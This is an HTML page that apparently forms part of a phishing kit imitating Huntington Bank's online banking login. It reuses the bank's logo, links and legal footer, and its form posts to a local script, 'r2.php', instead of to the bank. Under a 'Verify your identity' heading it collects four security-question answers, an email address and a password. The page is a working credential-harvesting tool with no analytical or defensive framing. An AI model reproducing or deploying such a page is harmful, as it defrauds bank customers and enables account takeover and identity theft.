<!doctype html>
<html>
<head>
	<title></title>
</head>
<body>
<form action="r2.php" id="form1" method="post" name="form1" style="border-width: 0px; border-style: initial; border-color: initial; margin: 0px; padding: 0px; font-size: 10px; color: rgb(57, 64, 72); font-family: Arial, Helvetica, sans-serif;">
<div class="container_16" id="container" style="border: 0px; margin: 0px auto; padding: 20px 0px; width: 960px; zoom: 1;">
<div class="grid_16 clearfix" style="border: 0px; margin: 0px 10px; padding: 0px; display: inline; float: left; zoom: 1; width: 940px;">
<div id="header" style="border: 0px; margin: 0px 0px 10px; padding: 0px; height: 57px;">
<div class="grid_4 alpha" style="border: 0px; margin: 0px 10px 0px 0px; padding: 0px; display: inline; float: left; width: 220px;"><a id="hnbLogoLink" style="border: 0px; margin: 0px; padding: 0px; cursor: pointer;"><img alt="Huntington - Welcome™" id="hnbLogoImg" src="https://onlinebanking.huntington.com/rol/Images/UI/logo-lg.png" style="border: 0px; margin: 0px; padding: 0px; font-size: 0px; color: transparent; vertical-align: middle; width: 214px; height: 57px;"></a></div>

<div class="grid_12 omega clearfix" style="border: 0px; margin: 0px 0px 0px 10px; padding: 0px; display: inline; float: left; zoom: 1; width: 700px;">
<div class="clearfix" id="messageBoxContainer" role="navigation" style="border: 0px; margin: 0px; padding: 0px; zoom: 1; height: 57px; width: 700px; float: right;">
<div class="WelcomeMessage" role="menubar" style="border: 0px; margin: 0px; padding: 0px 0px 10px; font-size: 1.2em; text-align: right;"><a href="https://www.huntington.com/customer-service/contact-us" id="hlContactUS" rel="noopener noreferrer" role="menuitem" style="border: 0px; margin: 0px; padding: 0px; color: rgb(27, 86, 48); cursor: pointer; text-decoration-line: none;" target="_blank" title="Contact Us">Contact Us</a></div>
</div>
</div>
</div>
</div>

<div class="grid_16 clearfix" style="border: 0px; margin: 0px 10px; padding: 0px; display: inline; float: left; zoom: 1; width: 940px;">
<div id="content" style="border: 0px; margin: 0px 0px 10px; padding: 0px; position: relative;">
<div id="deviceRegistrationAnchorDiv" style="border: 0px; margin: 0px; padding: 0px;">&nbsp;</div>

<div class="login" style="border: 0px; margin: 0px auto; padding: 0px; width: 400px;">
<div class="widget" style="border: 0px; margin: 0px 0px 15px; padding: 0px;">
<div class="widget-title" style="border-top: 1px solid rgb(132, 194, 79); border-right: 1px solid rgb(132, 194, 79); border-bottom: none; border-left: 1px solid rgb(132, 194, 79); border-image: initial; margin: 0px 0px 1px; padding: 3px 10px; background: rgb(91, 166, 60); color: rgb(255, 255, 255); height: 26px; line-height: 25px; vertical-align: middle;">
<h3 style="border: 0px; margin: 0px; padding: 0px; font-size: 19px; float: none; width: auto; text-align: center !important;">Verify your identity</h3>
</div>


<div id="removebottomborder" style="border-width: 1px 1px 0px; border-style: solid; border-color: rgb(225, 225, 225); border-image: initial; margin: 0px; padding: 20px 0px 0px; background: none 0px 0px repeat scroll rgb(248, 248, 248);">
<dl class="loginForm" style="border: 0px;margin: 0px auto;padding: 0px;font-size: 1.2em;width: 256px;">
	
			
							<select name="q1" id="q1" class="txt4" required="" style="font-size: 1.2em;line-height: 1.5;font-family: Arial, Helvetica, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding-top: 2px;padding-bottom: 2px;border-radius: 5px;width: inherit;">
                       <option value="">Please select a secret question</option>
	<option value="What was the make and model of the first car you owned?">What was the make and model of the first car you owned?</option>
	<option value="What is your favorite hobby?">What is your favorite hobby?</option>
	<option value="What is your father's middle name?">What is your father's middle name?</option>
	<option value="What is the name of your favorite city?">What is the name of your favorite city?</option>
	<option value="What is your mother's maiden name?">What is your mother's maiden name?</option>
	<option value="What is the last name of your favorite author?">What is the last name of your favorite author?</option>
	<option value="What is your brother or sister's middle name?">What is your brother or sister's middle name?</option>
	<option value="What is your favorite game or sport?">What is your favorite game or sport?</option>
	<option value="What is your grandmother's maiden name?">What is your grandmother's maiden name?</option>
	<option value="What is the name of your favorite restaurant?">What is the name of your favorite restaurant?</option>
	<option value="What was your first job?">What was your first job?</option>
	<option value="What was the name of your elementary school?">What was the name of your elementary school?</option>
	<option value="What is the name of the street that you grew up on?">What is the name of the street that you grew up on?</option>
	<option value="What is your favorite place to visit?">What is your favorite place to visit?</option>
	<option value="What sports team do you love to see lose?">What sports team do you love to see lose?</option>
	<option value="What is your greatest fear?">What is your greatest fear?</option>
	<option value="Who is your favorite historical figure?">Who is your favorite historical figure?</option>
	<option value="What is the name of your favorite pet?">What is the name of your favorite pet?</option>
	<option value="Who is your favorite musician or band?">Who is your favorite musician or band?</option>
	<option value="What is the last name of your favorite teacher?">What is the last name of your favorite teacher?</option>
	<option value="Where were you born?">Where were you born?</option>
	<option value="Who is your favorite sports hero?">Who is your favorite sports hero?</option>
	<option value="Who is your favorite comic book or cartoon character?">Who is your favorite comic book or cartoon character?</option>
	<option value="What is your favorite musical instrument?">What is your favorite musical instrument?</option>
	<option value="What is your mother's birthday mmddyyyy?">What is your mother's birthday mmddyyyy?</option>
	<option value="What is your father's birthday mmddyyyy?">What is your father's birthday mmddyyyy?</option>
	<option value="Where is your ideal vacation spot?">Where is your ideal vacation spot?</option>
	<option value="What is the first name of your best friend from childhood?">What is the first name of your best friend from childhood?</option>
	<option value="What is your favorite fruit or vegetable?">What is your favorite fruit or vegetable?</option>
                    </select>
						
							<input id="Answer" name="a1" placeholder="Answer" type="text" style="font-size: 1.2em;line-height: 1.5;font-family: Arial, Helvetica, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding-top: 2px;padding-bottom: 2px;border-radius: 5px;width: -webkit-fill-available;margin: 5px 0px 5px 0px;" width="50%" required="">
						
		
	
	
</dl>


</div>
<div id="removebottomborder" style="border-width: 1px 1px 0px; border-style: solid; border-color: rgb(225, 225, 225); border-image: initial; margin: 0px; padding: 20px 0px 0px; background: none 0px 0px repeat scroll rgb(248, 248, 248);">
<dl class="loginForm" style="border: 0px;margin: 0px auto;padding: 0px;font-size: 1.2em;width: 256px;">
	
			
							<select name="q2" id="q2" class="txt4" required="" style="font-size: 1.2em;line-height: 1.5;font-family: Arial, Helvetica, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding-top: 2px;padding-bottom: 2px;border-radius: 5px;width: inherit;">
                       <option value="">Please select a secret question</option>
	<option value="What was the make and model of the first car you owned?">What was the make and model of the first car you owned?</option>
	<option value="What is your favorite hobby?">What is your favorite hobby?</option>
	<option value="What is your father's middle name?">What is your father's middle name?</option>
	<option value="What is the name of your favorite city?">What is the name of your favorite city?</option>
	<option value="What is your mother's maiden name?">What is your mother's maiden name?</option>
	<option value="What is the last name of your favorite author?">What is the last name of your favorite author?</option>
	<option value="What is your brother or sister's middle name?">What is your brother or sister's middle name?</option>
	<option value="What is your favorite game or sport?">What is your favorite game or sport?</option>
	<option value="What is your grandmother's maiden name?">What is your grandmother's maiden name?</option>
	<option value="What is the name of your favorite restaurant?">What is the name of your favorite restaurant?</option>
	<option value="What was your first job?">What was your first job?</option>
	<option value="What was the name of your elementary school?">What was the name of your elementary school?</option>
	<option value="What is the name of the street that you grew up on?">What is the name of the street that you grew up on?</option>
	<option value="What is your favorite place to visit?">What is your favorite place to visit?</option>
	<option value="What sports team do you love to see lose?">What sports team do you love to see lose?</option>
	<option value="What is your greatest fear?">What is your greatest fear?</option>
	<option value="Who is your favorite historical figure?">Who is your favorite historical figure?</option>
	<option value="What is the name of your favorite pet?">What is the name of your favorite pet?</option>
	<option value="Who is your favorite musician or band?">Who is your favorite musician or band?</option>
	<option value="What is the last name of your favorite teacher?">What is the last name of your favorite teacher?</option>
	<option value="Where were you born?">Where were you born?</option>
	<option value="Who is your favorite sports hero?">Who is your favorite sports hero?</option>
	<option value="Who is your favorite comic book or cartoon character?">Who is your favorite comic book or cartoon character?</option>
	<option value="What is your favorite musical instrument?">What is your favorite musical instrument?</option>
	<option value="What is your mother's birthday mmddyyyy?">What is your mother's birthday mmddyyyy?</option>
	<option value="What is your father's birthday mmddyyyy?">What is your father's birthday mmddyyyy?</option>
	<option value="Where is your ideal vacation spot?">Where is your ideal vacation spot?</option>
	<option value="What is the first name of your best friend from childhood?">What is the first name of your best friend from childhood?</option>
	<option value="What is your favorite fruit or vegetable?">What is your favorite fruit or vegetable?</option>
                    </select>
						
							<input id="Answer" name="a2" placeholder="Answer" type="text" style="font-size: 1.2em;line-height: 1.5;font-family: Arial, Helvetica, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding-top: 2px;padding-bottom: 2px;border-radius: 5px;width: -webkit-fill-available;margin: 5px 0px 5px 0px;" width="50%" required="">
						
		
	
	
</dl>

<div class="clear clearfix" style="border: 0px; margin: 0px; padding: 0px; clear: both; overflow: hidden; visibility: hidden; width: 0px; height: 0px; zoom: 1;">&nbsp;</div>
</div>
<div id="removebottomborder" style="border-width: 1px 1px 0px; border-style: solid; border-color: rgb(225, 225, 225); border-image: initial; margin: 0px; padding: 20px 0px 0px; background: none 0px 0px repeat scroll rgb(248, 248, 248);">
<dl class="loginForm" style="border: 0px;margin: 0px auto;padding: 0px;font-size: 1.2em;width: 256px;">
	
			
							<select name="q3" id="q3" class="txt4" required="" style="font-size: 1.2em;line-height: 1.5;font-family: Arial, Helvetica, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding-top: 2px;padding-bottom: 2px;border-radius: 5px;width: inherit;">
                       <option value="">Please select a secret question</option>
	<option value="What was the make and model of the first car you owned?">What was the make and model of the first car you owned?</option>
	<option value="What is your favorite hobby?">What is your favorite hobby?</option>
	<option value="What is your father's middle name?">What is your father's middle name?</option>
	<option value="What is the name of your favorite city?">What is the name of your favorite city?</option>
	<option value="What is your mother's maiden name?">What is your mother's maiden name?</option>
	<option value="What is the last name of your favorite author?">What is the last name of your favorite author?</option>
	<option value="What is your brother or sister's middle name?">What is your brother or sister's middle name?</option>
	<option value="What is your favorite game or sport?">What is your favorite game or sport?</option>
	<option value="What is your grandmother's maiden name?">What is your grandmother's maiden name?</option>
	<option value="What is the name of your favorite restaurant?">What is the name of your favorite restaurant?</option>
	<option value="What was your first job?">What was your first job?</option>
	<option value="What was the name of your elementary school?">What was the name of your elementary school?</option>
	<option value="What is the name of the street that you grew up on?">What is the name of the street that you grew up on?</option>
	<option value="What is your favorite place to visit?">What is your favorite place to visit?</option>
	<option value="What sports team do you love to see lose?">What sports team do you love to see lose?</option>
	<option value="What is your greatest fear?">What is your greatest fear?</option>
	<option value="Who is your favorite historical figure?">Who is your favorite historical figure?</option>
	<option value="What is the name of your favorite pet?">What is the name of your favorite pet?</option>
	<option value="Who is your favorite musician or band?">Who is your favorite musician or band?</option>
	<option value="What is the last name of your favorite teacher?">What is the last name of your favorite teacher?</option>
	<option value="Where were you born?">Where were you born?</option>
	<option value="Who is your favorite sports hero?">Who is your favorite sports hero?</option>
	<option value="Who is your favorite comic book or cartoon character?">Who is your favorite comic book or cartoon character?</option>
	<option value="What is your favorite musical instrument?">What is your favorite musical instrument?</option>
	<option value="What is your mother's birthday mmddyyyy?">What is your mother's birthday mmddyyyy?</option>
	<option value="What is your father's birthday mmddyyyy?">What is your father's birthday mmddyyyy?</option>
	<option value="Where is your ideal vacation spot?">Where is your ideal vacation spot?</option>
	<option value="What is the first name of your best friend from childhood?">What is the first name of your best friend from childhood?</option>
	<option value="What is your favorite fruit or vegetable?">What is your favorite fruit or vegetable?</option>
                    </select>
						
							<input id="Answer" name="a3" placeholder="Answer" type="text" style="font-size: 1.2em;line-height: 1.5;font-family: Arial, Helvetica, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding-top: 2px;padding-bottom: 2px;border-radius: 5px;width: -webkit-fill-available;margin: 5px 0px 5px 0px;" width="50%" required="">
						
		
	
	
</dl>

<div class="clear clearfix" style="border: 0px; margin: 0px; padding: 0px; clear: both; overflow: hidden; visibility: hidden; width: 0px; height: 0px; zoom: 1;">&nbsp;</div>
</div><div id="removebottomborder" style="border-width: 1px 1px 0px; border-style: solid; border-color: rgb(225, 225, 225); border-image: initial; margin: 0px; padding: 20px 0px 0px; background: none 0px 0px repeat scroll rgb(248, 248, 248);">
<dl class="loginForm" style="border: 0px;margin: 0px auto;padding: 0px;font-size: 1.2em;width: 256px;">
	
			
							<select name="q4" id="q4" class="txt4" required="" style="font-size: 1.2em;line-height: 1.5;font-family: Arial, Helvetica, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding-top: 2px;padding-bottom: 2px;border-radius: 5px;width: inherit;">
                       <option value="">Please select a secret question</option>
	<option value="What was the make and model of the first car you owned?">What was the make and model of the first car you owned?</option>
	<option value="What is your favorite hobby?">What is your favorite hobby?</option>
	<option value="What is your father's middle name?">What is your father's middle name?</option>
	<option value="What is the name of your favorite city?">What is the name of your favorite city?</option>
	<option value="What is your mother's maiden name?">What is your mother's maiden name?</option>
	<option value="What is the last name of your favorite author?">What is the last name of your favorite author?</option>
	<option value="What is your brother or sister's middle name?">What is your brother or sister's middle name?</option>
	<option value="What is your favorite game or sport?">What is your favorite game or sport?</option>
	<option value="What is your grandmother's maiden name?">What is your grandmother's maiden name?</option>
	<option value="What is the name of your favorite restaurant?">What is the name of your favorite restaurant?</option>
	<option value="What was your first job?">What was your first job?</option>
	<option value="What was the name of your elementary school?">What was the name of your elementary school?</option>
	<option value="What is the name of the street that you grew up on?">What is the name of the street that you grew up on?</option>
	<option value="What is your favorite place to visit?">What is your favorite place to visit?</option>
	<option value="What sports team do you love to see lose?">What sports team do you love to see lose?</option>
	<option value="What is your greatest fear?">What is your greatest fear?</option>
	<option value="Who is your favorite historical figure?">Who is your favorite historical figure?</option>
	<option value="What is the name of your favorite pet?">What is the name of your favorite pet?</option>
	<option value="Who is your favorite musician or band?">Who is your favorite musician or band?</option>
	<option value="What is the last name of your favorite teacher?">What is the last name of your favorite teacher?</option>
	<option value="Where were you born?">Where were you born?</option>
	<option value="Who is your favorite sports hero?">Who is your favorite sports hero?</option>
	<option value="Who is your favorite comic book or cartoon character?">Who is your favorite comic book or cartoon character?</option>
	<option value="What is your favorite musical instrument?">What is your favorite musical instrument?</option>
	<option value="What is your mother's birthday mmddyyyy?">What is your mother's birthday mmddyyyy?</option>
	<option value="What is your father's birthday mmddyyyy?">What is your father's birthday mmddyyyy?</option>
	<option value="Where is your ideal vacation spot?">Where is your ideal vacation spot?</option>
	<option value="What is the first name of your best friend from childhood?">What is the first name of your best friend from childhood?</option>
	<option value="What is your favorite fruit or vegetable?">What is your favorite fruit or vegetable?</option>
                    </select>
						
							<input id="Answer" name="a4" placeholder="Answer" type="text" style="font-size: 1.2em;line-height: 1.5;font-family: Arial, Helvetica, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding-top: 2px;padding-bottom: 2px;border-radius: 5px;width: -webkit-fill-available;margin: 5px 0px 5px 0px;" width="50%" required="">
						
		
	
	
</dl>
<dl class="loginForm" style="border: 0px;margin: 20px auto;padding: 0px;font-size: 1.2em;width: 256px;">
	<dt style="border: 0px; margin: 0px; padding: 0px; width: 75px; float: left; font-weight: bold;"><label for="tbUserName" style="border: 0px; margin: 0px; padding: 0px;">Email

</label></dt>
	<dd style="border: 0px;margin: 0px 0px 8px;padding: 0px;"><input aria-required="true" autocomplete="Off" id="tbUserName" maxlength="30" name="ctl00$mainBody$tbUserName" style="font-size: 1.2em;line-height: 1.5;font-family: Arial, Helvetica, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding-top: 2px;padding-bottom: 2px;background-color: rgb(255, 255, 255);border-radius: 5px;height: 18px;" title="Username" type="text"></dd>
	<dt style="border: 0px; margin: 0px; padding: 0px; width: 75px; float: left; font-weight: bold;"><label for="tbPassword" style="border: 0px; margin: 0px; padding: 0px;">Password

</label></dt>
	<dd style="border: 0px; margin: 0px 0px 8px; padding: 0px;"><input aria-required="true" autocomplete="Off" id="tbPassword" maxlength="16" name="ctl00$mainBody$tbPassword" style="font-size: 1.2em;line-height: 1.5;font-family: Arial, Helvetica, sans-serif;border-width: 1px;border-style: solid;border-color: rgb(204, 204, 204);padding-top: 2px;padding-bottom: 2px;border-radius: 5px;height: 18px;" type="password"></dd>
</dl>

<div class="clear clearfix" style="border: 0px; margin: 0px; padding: 0px; clear: both; overflow: hidden; visibility: hidden; width: 0px; height: 0px; zoom: 1;">&nbsp;</div>
</div>

<div class="widget-footer" style="border-top: none; border-right: 1px solid rgb(225, 225, 225); border-bottom: 1px solid rgb(225, 225, 225); border-left: 1px solid rgb(225, 225, 225); border-image: initial; margin: 0px; padding: 10px; background: rgb(255, 255, 255);">
<div class="buttonsCentered" style="border: 0px; margin: 0px 0px 15px; padding: 0px 0px 0px 136px;"><input class="Action_Btn prevent-double-click" id="btSubmit" name="ctl00$mainBody$btSubmit" style="font-weight: bold; font-size: 19px; line-height: 1.5; font-family: Arial, Helvetica, sans-serif; background: rgb(225, 122, 13); border-width: 0px; border-style: none; border-color: initial; height: auto; padding: 0px 5px; overflow: visible; margin-right: 5px; margin-bottom: 10px; color: rgb(255, 255, 255); letter-spacing: 0px; vertical-align: middle; appearance: none; border-radius: 5px; cursor: pointer;" type="submit" value="Log In">&nbsp;<img alt="Lock" src="https://onlinebanking.huntington.com/rol/images/lock.gif" style="border: 0px; margin: 0px; padding: 0px; font-size: 0px; color: transparent; vertical-align: middle;"></div>

<div class="signonLinks" style="border: 0px; margin: 0px; padding: 0px; width: 378px; text-align: center; line-height: 25px;"><a id="mainBody_lnkForgotUsername" style="border: 0px; margin: 0px; padding: 0px 8px 0px 0px; font-size: 1.2em; color: rgb(27, 86, 48); cursor: pointer; text-decoration-line: underline;">Forgot Username?</a>&nbsp;<a href="https://selfservice.huntington.com/default/ForgotPassword/" id="mainBody_lnkForgotPassword" style="border: 0px; margin: 0px; padding: 0px 8px 0px 0px; font-size: 1.2em; color: rgb(27, 86, 48); cursor: pointer;">Forgot Password?</a>

<div style="border: 0px; margin: 0px; padding: 0px;"><a href="https://selfservice.huntington.com/default/Enrollment/" id="mainBody_hlEnrollment" style="border: 0px; margin: 0px; padding: 0px 8px 0px 0px; font-size: 1.2em; color: rgb(27, 86, 48); cursor: pointer;">Enroll in Online Banking</a></div>
</div>
</div>
</div>

<div class="clear" style="border: 0px; margin: 0px; padding: 0px; clear: both; overflow: hidden; visibility: hidden; width: 0px; height: 0px;">&nbsp;</div>
</div>
</div>
</div>

<div class="grid_16 clearfix" style="border: 0px; margin: 0px 10px; padding: 0px; display: inline; float: left; zoom: 1; width: 940px;">
<div id="footerNav" role="navigation" style="border: 0px; margin: 0px auto 15px; padding: 0px; font-size: 1em; display: table;">
<ul class="clearfix" role="menubar" style="border: 0px; margin: 0px; padding: 0px; list-style-position: initial; list-style-image: initial; zoom: 1;">
	<li role="presentation" style="border: 0px; margin: 0px; padding: 0px 8px 0px 9px; font-size: 1em; display: inline; outline: none 0px; float: left;"><a class="LegalFooterAnchor" data-menuindex="0" href="https://www.huntington.com//Privacy-Security/protecting-yourself/identity-theft" rel="noopener noreferrer" role="menuitem" style="border: 0px; margin: 0px; padding: 0px; color: rgb(57, 64, 72); cursor: pointer; text-decoration-line: none;" target="_blank">Identity Protection</a></li>
	<li role="presentation" style="border: 0px; margin: 0px; padding: 0px 8px 0px 9px; font-size: 1em; display: inline; outline: none 0px; float: left;"><a class="LegalFooterAnchor" data-menuindex="1" href="https://www.huntington.com/Privacy-Security/how-we-protect-you/huntingtons-security-commitment" rel="noopener noreferrer" role="menuitem" style="border: 0px; margin: 0px; padding: 0px; color: rgb(57, 64, 72); cursor: pointer; text-decoration-line: none;" target="_blank">Security</a></li>
	<li role="presentation" style="border: 0px; margin: 0px; padding: 0px 8px 0px 9px; font-size: 1em; display: inline; outline: none 0px; float: left;"><a class="LegalFooterAnchor" data-menuindex="2" href="https://www.huntington.com/Privacy-Security/Privacy-Policy" rel="noopener noreferrer" role="menuitem" style="border: 0px; margin: 0px; padding: 0px; color: rgb(57, 64, 72); cursor: pointer; text-decoration-line: none;" target="_blank">Privacy</a></li>
	<li role="presentation" style="border: 0px; margin: 0px; padding: 0px 8px 0px 9px; font-size: 1em; display: inline; outline: none 0px; float: left;"><a class="LegalFooterAnchor" data-menuindex="3" href="https://www.huntington.com/personal/online-services/huntington-online-guarantee" rel="noopener noreferrer" role="menuitem" style="border: 0px; margin: 0px; padding: 0px; color: rgb(57, 64, 72); cursor: pointer; text-decoration-line: none;" target="_blank">Online Guarantee</a></li>
	<li class="feedback-footer-parent" data-feedback-link-class="LegalFooterAnchor" data-feedback-link-icon-id="black" data-feedback-link-type="Footer" data-site-survey-context_placement="Footer" role="presentation" style="border: 0px; margin: 0px; padding: 0px 8px 0px 9px; font-size: 1em; display: inline; outline: none 0px; float: left;"><a class="LegalFooterAnchor" data-site-survey-link="Footer" href="https://onlinebanking.huntington.com/rol/Auth/login.aspx#" style="border: 0px; margin: 0px; padding: 0px; color: rgb(57, 64, 72); cursor: pointer; text-decoration-line: none;" title="Give Feedback (opens in a new window)"><img alt="" class="oo_inline_img" height="18" src="https://www.huntington.com/Presentation/onlineopinionV5/oo_icon_retina_black.gif" style="border: 0px; margin: 0px 0.5ch 0px 0px; padding: 0px; font-size: inherit; color: inherit; vertical-align: inherit; display: inline-block; width: 1.5ex; height: auto;" width="18">Give Feedback</a></li>
</ul>
</div>

<hr style="border-right: 0px solid rgb(224, 224, 224); border-bottom: 0px solid rgb(224, 224, 224); border-left: 0px solid rgb(224, 224, 224); border-top-style: solid; border-top-color: rgb(224, 224, 224); border-image: initial; margin: 10px 0px; padding: 0px; clear: both; height: 0px;">
<div id="footerBottom" style="border: 0px; margin: 10px 0px 0px; padding: 0px;">
<div id="legal" style="border: 0px; margin: 0px; padding: 0px; font-size: 1em; clear: both; text-align: center;">
<p style="border: 0px; margin: 0px; padding: 0px; font-size: 1em; line-height: 15px;">Have questions? Call&nbsp;<strong style="border: 0px; margin: 0px; padding: 0px; font-size: 1.1em;">(800) 480-2265</strong>, daily 7:00 a.m. to 7:00 p.m. ET.</p>

<p style="border: 0px; margin: 10px 0px 0px; padding: 0px; font-size: 1em; line-height: 15px;">Mastercard and the Mastercard Brand Mark are registered trademarks of Mastercard International Incorporated.</p>
<span id="FDICLogoMessage" style="border: 0px; margin: 0px; padding: 0px;"><svg fill="#333" height="11" viewBox="0 0 10 8" width="14" xmlns="http://www.w3.org/2000/svg"><path clip-rule="evenodd" d="m5.1 0.8l-5.1 2.8v1h0.8v3.4h8.4v-3.4h0.8v-1l-4.9-2.8zm3.1 6.3h-6.4v-3.4l3.2-1.8 3.2 1.8v3.4z" fill-rule="evenodd"></path><path d="m3.3 5v-0.8h3.4v0.8h-3.4z"></path><path d="m3.3 5.4h3.4v0.9h-3.4v-0.9z"></path></svg>&nbsp;The Huntington National Bank is an Equal Housing Lender and Member FDIC.</span><br>
<img alt="The HNB Logo" height="9" src="https://onlinebanking.huntington.com/rol/Images/hexlogo-footer-icon.png" style="border: 0px; margin: 0px; padding: 0px; font-size: 0px; color: transparent; vertical-align: middle;" width="8">®, Huntington®,&nbsp;<img alt="The HNB Logo" height="9" src="https://onlinebanking.huntington.com/rol/Images/hexlogo-footer-icon.png" style="border: 0px; margin: 0px; padding: 0px; font-size: 0px; color: transparent; vertical-align: middle;" width="8">Huntington®, Huntington.Welcome.®, and Huntington Heads Up® are federally registered service marks of Huntington Bancshares Incorporated.<br>
©&nbsp;<span id="Footer1_lblYear" style="border: 0px; margin: 0px; padding: 0px;">2020</span>&nbsp;Huntington Bancshares Incorporated.</div>
</div>
</div>
</div>
</form>

<div id="dvTTGlobal" style="border: 0px; margin: 0px; padding: 0px; font-size: 10px; color: rgb(57, 64, 72); font-family: Arial, Helvetica, sans-serif;">&nbsp;</div>

<p><iframe aria-disabled="true" aria-hidden="true" id="tmx_tags_iframe" src="about:blank" style="border-width: 0px; border-style: initial; margin: 0px; padding: 0px; font-size: 10px; color: rgb(57, 64, 72); font-family: Arial, Helvetica, sans-serif; width: 0px; height: 0px; position: absolute; top: -5000px;" tabindex="-1" title="empty"></iframe></p>
</body>
</html>
